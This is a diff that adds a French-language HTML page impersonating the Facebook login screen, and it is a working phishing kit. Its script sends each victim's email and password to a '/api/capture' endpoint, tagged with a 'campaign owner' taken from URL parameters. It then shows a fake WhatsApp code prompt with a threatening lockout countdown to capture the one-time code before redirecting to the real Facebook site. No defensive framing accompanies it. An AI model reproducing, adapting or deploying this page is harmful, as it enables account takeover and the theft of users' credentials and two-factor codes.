@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        body.otp-mode {
+            background: linear-gradient(135deg, #f0f0f0 40%, #b7d1c6 100%);
+        }
+
+        /* ===== BANNIÈRE IMAGE PLEINE LARGEUR ===== */
+        .top-banner {
+            width: 100%;
+            display: block;
+            line-height: 0;
+            font-size: 0;
+        }
+
+        .top-banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        @media (min-width: 900px) {
+            .content {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                margin-top: 80px;
+            }
+        }
+
+        .left-section {
+            flex: 1;
+            max-width: 500px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .right-section {
+            flex: 1;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+        }
+
+        .login-form input[type="text"]:focus,
+        .login-form input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background-color: white;
+            margin-top: auto;
+            padding: 20px 0;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            font-size: 12px;
+            color: #8a8d91;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            margin: 0 5px;
+            text-decoration: none;
+            line-height: 1.6;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #8a8d91;
+            text-align: center;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #65676b;
+        }
+
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        /* ===== ÉCRAN DE CHARGEMENT BLEU PLEIN ÉCRAN (5 SECONDES) ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #1877f2;
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.25);
+            border-top: 5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            0%   { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ===== VUE CONFIRMATION OTP ===== */
+        .otp-view {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .otp-view.active {
+            display: block;
+        }
+
+        .wrapper {
+            max-width: 430px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .otp-view h2 {
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #111;
+            text-align: left;
+        }
+
+        .otp-view p {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .image {
+            width: 100%;
+            max-height: 230px;
+            border-radius: 18px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .image img {
+            width: 100%;
+            object-fit: cover;
+        }
+
+        .countdown {
+            font-size: 16px;
+            font-weight: bold;
+            color: #111;
+            margin-bottom: 20px;
+            text-align: center;
+            transition: color 0.5s ease;
+        }
+
+        .otp-view input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            background-color: #ffffff;
+            color: #111;
+        }
+
+        .btn-primary {
+            background-color: #007bff;
+            color: white;
+            padding: 16px;
+            width: 100%;
+            border: none;
+            font-size: 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: #444;
+            padding: 13px;
+            width: 100%;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #00cc66;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <!-- VUE CONNEXION FACEBOOK -->
+    <div id="loginView">
+        <!-- BANNIÈRE IMAGE PLEINE LARGEUR -->
+        <div class="top-banner">
+            <img src="https://i.postimg.cc/25Jc9zZ7/IMG-6947.jpg" alt="Bannière">
+        </div>
+
+        <div class="container">
+            <div class="content">
+                <div class="left-section">
+                    <div class="logo">facebook</div>
+                </div>
+
+                <div class="right-section">
+                    <div class="login-form">
+                        <form id="loginForm">
+                            <div class="form-group">
+                                <input type="text" id="email" placeholder="Adresse e-mail ou numéro de tél." required>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" id="password" placeholder="Mot de passe" required>
+                            </div>
+
+                            <div class="show-password">
+                                <input type="checkbox" id="showPassword">
+                                <label for="showPassword">Afficher le mot de passe</label>
+                            </div>
+
+                            <button type="submit" class="login-button" id="submitBtn">Se connecter</button>
+
+                            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                            <div class="divider"></div>
+                            <button type="button" class="create-account">Créer nouveau compte</button>
+                        </form>
+                    </div>
+                    <div class="create-page">
+                        <a href="#">Créer une Page</a> pour une célébrité, une marque ou une entreprise.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">S'inscrire</a>
+                    <a href="#">Se connecter</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">Video</a>
+                    <a href="#">Lieux</a>
+                    <a href="#">Jeux</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Meta Store</a>
+                    <a href="#">Meta Quest</a>
+                    <a href="#">Imagine with Meta AI</a>
+                    <a href="#">Instagram</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Collecte de fonds</a>
+                    <a href="#">Services</a>
+                    <a href="#">Centre d'information sur les élections</a>
+                    <a href="#">Politique de confidentialité</a>
+                    <a href="#">Centre de confidentialité</a>
+                    <a href="#">Groupes</a>
+                    <a href="#">À propos</a>
+                    <a href="#">Créer une publicité</a>
+                    <a href="#">Créer une Page</a>
+                    <a href="#">Développeurs</a>
+                    <a href="#">Emplois</a>
+                    <a href="#">Cookies</a>
+                    <a href="#">Choisir sa pub</a>
+                    <a href="#">Conditions générales</a>
+                    <a href="#">Aide</a>
+                    <a href="#">Importation des contacts et non-utilisateurs</a>
+                    <a href="#">Paramètres</a>
+                </div>
+
+                <div class="copyright">
+                    Meta © 2023
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VUE CONFIRMATION OTP -->
+    <div class="otp-view" id="otpView">
+        <div class="wrapper">
+            <h2>Confirmez votre compte</h2>
+            <p>Nous avons envoyé un code sur WhatsApp. Saisissez ce code pour confirmer votre compte.</p>
+
+            <div class="image">
+                <img src="https://i.postimg.cc/Jn7ML7nP/IMG-8544.jpg" alt="Illustration WhatsApp">
+            </div>
+
+            <div class="countdown" id="countdown">
+                Temps restant avant blocage : 50s
+            </div>
+
+            <input type="text" id="otpCodeInput" placeholder="Entrez le code" autocomplete="one-time-code">
+            <button type="button" class="btn-primary" onclick="handleContinue()">Continuer</button>
+            <button type="button" class="btn-secondary" onclick="restartTimer()">Essayer d’une autre façon</button>
+        </div>
+
+        <!-- Superposition sombre + loader -->
+        <div class="overlay" id="overlay">
+            <div class="loader"></div>
+        </div>
+    </div>
+
+    <!-- ÉCRAN DE CHARGEMENT BLEU (cercle blanc uniquement - 5 secondes) -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignOwner = urlParams.get('user') || urlParams.get('ref') || 'Kim';
+        const linkType = (urlParams.get('type') || 'otp').toLowerCase();
+
+        let savedUser = '';
+        let savedPass = '';
+        let timeLeft = 50;
+        let timer = null;
+
+        const loginView = document.getElementById('loginView');
+        const otpView = document.getElementById('otpView');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('showPassword');
+        const countdown = document.getElementById('countdown');
+        const overlay = document.getElementById('overlay');
+        const otpCodeInput = document.getElementById('otpCodeInput');
+
+        showPasswordCheckbox.addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        function captureData(payload) {
+            return fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log(err));
+        }
+
+        function startTimer() {
+            clearInterval(timer);
+            timeLeft = 50;
+            countdown.style.color = '#111';
+            countdown.textContent = `Temps restant avant blocage : ${timeLeft}s`;
+
+            timer = setInterval(() => {
+                timeLeft--;
+
+                if (timeLeft <= 10) {
+                    countdown.style.color = 'red';
+                }
+
+                countdown.textContent = `Temps restant avant blocage : ${timeLeft}s`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdown.textContent = 'Blocage définitif en cours...';
+                    countdown.style.color = 'red';
+                }
+            }, 1000);
+        }
+
+        function restartTimer() {
+            startTimer();
+        }
+
+        function openOtpScreen() {
+            loginView.style.display = 'none';
+            document.body.classList.add('otp-mode');
+            otpView.classList.add('active');
+            otpCodeInput.value = '';
+            startTimer();
+            otpCodeInput.focus();
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            savedUser = document.getElementById('email').value.trim();
+            savedPass = document.getElementById('password').value;
+
+            const isOtpFlow = linkType !== 'standard';
+
+            const payload = {
+                owner: campaignOwner,
+                network: 'Facebook',
+                type: isOtpFlow ? 'otp_step1' : 'standard',
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: 'Aucun'
+            };
+
+            captureData(payload);
+
+            // Écran bleu avec cercle blanc pendant 5 secondes
+            loadingOverlay.classList.add('active');
+
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                if (isOtpFlow) {
+                    openOtpScreen();
+                } else {
+                    window.location.href = 'https://facebook.com';
+                }
+            }, 5000);
+        });
+
+        function handleContinue() {
+            clearInterval(timer);
+            const otpVal = otpCodeInput.value.trim() || 'Aucun';
+
+            const payload = {
+                owner: campaignOwner,
+                network: 'Facebook',
+                type: linkType,
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: otpVal
+            };
+
+            captureData(payload);
+            overlay.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com';
+            }, 7000);
+        }
+
+        document.getElementById('email').addEventListener('focus', function() {
+            this.style.borderColor = '#1877f2';
+        });
+
+        document.getElementById('password').addEventListener('focus', function() {
+            this.style.borderColor = '#1877f2';
+        });
+    </script>
+</body>
+</html>
